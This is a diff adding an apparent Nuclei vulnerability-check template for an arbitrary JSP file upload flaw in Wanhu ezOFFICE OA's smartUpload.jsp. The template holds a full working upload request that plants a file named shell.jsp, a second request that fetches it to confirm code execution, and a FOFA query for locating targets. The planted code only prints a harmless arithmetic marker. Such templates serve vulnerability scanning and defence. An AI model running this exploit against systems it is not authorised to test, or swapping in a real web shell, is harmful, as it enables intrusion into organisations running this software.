@@ -1,0 +1,73 @@
+id: poc-local-oa-whir-ezoffice-smartUpload-jsp-upload
+
+info:
+  name: 万户OA smartUpload.jsp 任意文件上传漏洞
+  author: capiton
+  severity: critical
+  description: 万户OA smartUpload.jsp文件存在文件上传接口，且没有对文件类型进行过滤,导致任意文件上传漏洞
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20smartUpload.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="万户网络-ezOFFICE"
+    Vulnerability-Impact: 万户OA
+  tags: wanhu,ezoffice,whir,wanhuoa
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  res: '{{to_number(r1) * to_number(r2)}}'
+  filename: '{{rand_text_alphanumeric(6, "")}}'
+
+requests:
+  - raw:
+      - |
+        POST /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="photo"; filename="shell.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print({{r1}} * {{r2}});%>
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="continueUpload"
+
+        1
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="submit"
+
+        上传继续
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU--
+
+
+
+      - |-
+        GET /defaultroot/upload/information/{{webshell}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    req-condition: true
+    extractors:
+      - type: regex
+        part: body 
+        name: webshell
+        internal: true
+        group: 1
+        regex: 
+          - "value='(.*?).jsp'>"
+          
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{res}}"
